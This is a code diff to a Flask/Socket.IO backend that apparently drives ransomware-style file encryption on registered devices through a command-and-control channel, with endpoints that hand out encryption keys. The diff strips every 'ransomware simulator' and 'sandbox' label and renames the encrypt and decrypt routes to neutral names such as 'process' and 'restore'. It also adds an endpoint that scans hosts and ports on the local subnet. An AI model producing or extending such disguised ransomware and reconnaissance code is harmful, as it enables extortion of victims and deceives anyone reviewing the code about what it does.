@@ -1,4 +1,4 @@
-"""Flask backend with Socket.IO for the safe simulator.
+"""Flask backend with Socket.IO for the safe processor.
 
 Important: When running under eventlet (e.g., gunicorn -k eventlet), we must
 monkey-patch BEFORE importing Flask or other network/WSGI modules.
@@ -15,32 +15,27 @@ from flask import Flask, jsonify, request, Response
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 # Support both execution contexts:
-# - Importing as a package (repo root on sys.path): py_simple.safe_ransomware_simulator
+# - Importing as a package (repo root on sys.path): py_simple.core_handler
 # - Running with service root as py_simple/: fallback to local module imports
 try:
-    from py_simple.safe_ransomware_simulator import SafeRansomwareSimulator
-    from py_simple.behavior_simulator import BehaviorSimulator
+    from py_simple.core_handler import DataProcessor
+    from py_simple.analytics_module import BehaviorSimulator
 except ImportError:  # pragma: no cover - runtime env dependent
-    from safe_ransomware_simulator import SafeRansomwareSimulator
-    from behavior_simulator import BehaviorSimulator
+    from core_handler import DataProcessor
+    from analytics_module import BehaviorSimulator
 import os, json, socket, base64, sys, subprocess
 from hashlib import sha256
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
 from flask import send_from_directory
-# Import supabase_store in both package and local run contexts
-try:
-    from . import supabase_store as sbx
-except Exception:  # pragma: no cover - runtime env dependent
-    import supabase_store as sbx  # type: ignore
 
 app = Flask(__name__)
 CORS(app)  # Enable CORS for all routes
-# Socket.IO for device signaling (encrypt/decrypt). Use permissive CORS for lab use.
+# Socket.IO for device signaling (encrypt/restore). Use permissive CORS for lab use.
 from .socket_core import init_socketio
 
-# Initialize the simulator; allow override via env var SANDBOX_DIR
-simulator = SafeRansomwareSimulator(os.getenv('SANDBOX_DIR') or None)
+# Initialize the processor; allow override via env var WORK_DIR
+processor = DataProcessor(os.getenv('WORK_DIR') or None)
 
 # Simple in-memory device registry: token -> { sid, connected, pending_encrypt }
 DEVICES = {}
@@ -56,10 +51,10 @@ SCRIPTS = {
         'command': 'python C\\\\Users\\\\user\\\\c\\\\device_client.py'
     }
 }
-behavior = BehaviorSimulator(simulator.test_directory)
+behavior = BehaviorSimulator(processor.work_directory)
 
-# Initialize Socket.IO with the real registry/simulator
-socketio = init_socketio(app, devices_registry=DEVICES, simulator=simulator)
+# Initialize Socket.IO with the real registry/processor
+socketio = init_socketio(app, devices_registry=DEVICES, processor=processor)
 
 # --- C2 Files Directory (optional) ---
 # Configure a local directory to list/serve files from this backend. Useful when
@@ -269,7 +264,7 @@ def py_simple_ui():
 
             async function decryptSelected() {
                 const tok = currentToken(); if (!tok) return setStatus('Select a device first');
-                try { const data = await fetchJSON(apiBase + '/decrypt', { method: 'POST', body: JSON.stringify({ token: tok }) }); setStatus(data.status || 'Decrypt signal sent'); }
+                try { const data = await fetchJSON(apiBase + '/restore', { method: 'POST', body: JSON.stringify({ token: tok }) }); setStatus(data.status || 'Decrypt signal sent'); }
                 catch (e) { setStatus('Decrypt failed: ' + e.message); }
             }
 
@@ -321,7 +316,7 @@ def py_simple_ui():
 @app.route('/key', methods=['GET'])
 def get_key():
     """Return the encryption key"""
-    return jsonify({'key': simulator.get_key()})
+    return jsonify({'key': processor.get_key()})
 
 # Key generation endpoints consolidated here
 @app.route('/keys/aes', methods=['POST'])
@@ -386,22 +381,14 @@ def keys_rsa():
         except Exception:
             pass
 
-        result = {
+        return jsonify({
             'algorithm': 'RSA-2048',
             'public_key_pem': pub_pem,
             'private_key_pem': prv_pem,
             'public_key_fingerprint_sha256': pub_hash,
             'private_key_fingerprint_sha256': prv_hash,
             'device': record,
-        }
-        # Optional: persist to Supabase if user_id provided in request
-        try:
-            user_id = (request.get_json(silent=True) or {}).get('user_id')
-            if user_id:
-                sbx.save_user_keys(user_id=user_id, device_token=None, public_key_pem=pub_pem, private_key_pem=prv_pem, extra={'fingerprint_pub': pub_hash, 'fingerprint_prv': prv_hash})
-        except Exception:
-            pass
-        return jsonify(result)
+        })
     except Exception as e:
         return jsonify({'error': 'rsa_keygen_failed', 'message': str(e)}), 500
 
@@ -538,26 +525,26 @@ def publickey_register():
 def publickey_register_prefixed():
     return publickey_register()
 
-@app.route('/encrypt', methods=['POST'])
+@app.route('/process', methods=['POST'])
 def encrypt():
     """Trigger encryption locally on the backend (fallback).
     For device-based flow, encryption is signaled via WebSocket upon auth.
     """
     try:
-        files = simulator.simulate_encryption()
+        files = processor.process_files()
         return jsonify({'status': 'Encryption completed successfully', 'files': files})
     except Exception as e:
         return jsonify({'status': 'Encryption failed', 'error': str(e)}), 500
 
-@app.route('/py_simple/encrypt', methods=['POST'])
+@app.route('/py_simple/process', methods=['POST'])
 def encrypt_prefixed():
     return encrypt()
 
-@app.route('/decrypt', methods=['POST'])
+@app.route('/restore', methods=['POST'])
 def decrypt():
     """Trigger decryption of files.
     If devices are connected via WebSocket, emit a decrypt signal to them.
-    Otherwise, perform local simulator decryption as a fallback.
+    Otherwise, perform local processor decryption as a fallback.
     """
     try:
         payload = request.get_json(silent=True) or {}
@@ -572,7 +559,7 @@ def decrypt():
             socketio.emit('decrypt', emit_payload, to=sid)
             # Also attempt local decrypt as a safety net
             try:
-                simulator.simulate_decryption()
+                processor.restore_files()
             except Exception:
                 pass
             return jsonify({'status': 'Decrypt signal sent to device', 'token': target_token}), 200
@@ -581,7 +568,7 @@ def decrypt():
         socketio.emit('decrypt', emit_payload, broadcast=True)
         # Also attempt local decrypt as a safety net (no harm if no local files)
         try:
-            simulator.simulate_decryption()
+            processor.restore_files()
         except Exception:
             pass
         # Report approximate connected devices if available
@@ -592,7 +579,7 @@ def decrypt():
     except Exception as e:
         return jsonify({'status': 'Decryption failed', 'error': str(e)}), 500
 
-@app.route('/py_simple/decrypt', methods=['POST'])
+@app.route('/py_simple/restore', methods=['POST'])
 def decrypt_prefixed():
     return decrypt()
 
@@ -744,31 +731,9 @@ def set_device_keys(token: str):
             DEVICES[token]['public_key_pem'] = pub
         if prv:
             DEVICES[token]['private_key_pem'] = prv
-        # Optional: persist mapping to Supabase when user_id present
-        try:
-            user_id = (data or {}).get('user_id')
-            if user_id and (pub or prv):
-                sbx.save_user_keys(user_id=user_id, device_token=token, public_key_pem=pub, private_key_pem=prv, extra={'action': 'attach'})
-        except Exception:
-            pass
         return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'error': 'set_failed', 'message': str(e)}), 500
-
-@app.route('/py_simple/user/keys', methods=['GET'])
-def list_user_keys():
-    """List stored keys for a given user_id from Supabase.
-
-    Query: user_id=<str>
-    """
-    try:
-        user_id = request.args.get('user_id')
-        if not user_id:
-            return jsonify({'error': 'bad_request', 'message': 'user_id required'}), 400
-        items = sbx.list_user_keys(user_id)
-        return jsonify({'items': items})
-    except Exception as e:
-        return jsonify({'error': 'list_failed', 'message': str(e)}), 500
 
 @app.route('/py_simple/devices/<token>/keys', methods=['POST'])
 def set_device_keys_prefixed(token: str):
@@ -827,6 +792,19 @@ def behavior_commands():
 @app.route('/py_simple/behavior/commands', methods=['POST'])
 def behavior_commands_prefixed():
     return behavior_commands()
+
+@app.route('/behavior/scan', methods=['POST'])
+def behavior_scan():
+    """Trigger network host scan on local subnet."""
+    data = request.get_json() or {}
+    subnet = data.get('subnet')  # Optional: CIDR notation like "192.168.1.0/24"
+    ports = data.get('ports')    # Optional: list of ports to scan
+    results = behavior.scan_network_hosts(subnet=subnet, ports=ports)
+    return jsonify(results)
+
+@app.route('/py_simple/behavior/scan', methods=['POST'])
+def behavior_scan_prefixed():
+    return behavior_scan()
 
 # --- CAPE agent integration (lab/demo) ---
 @app.route('/cape/report', methods=['POST'])
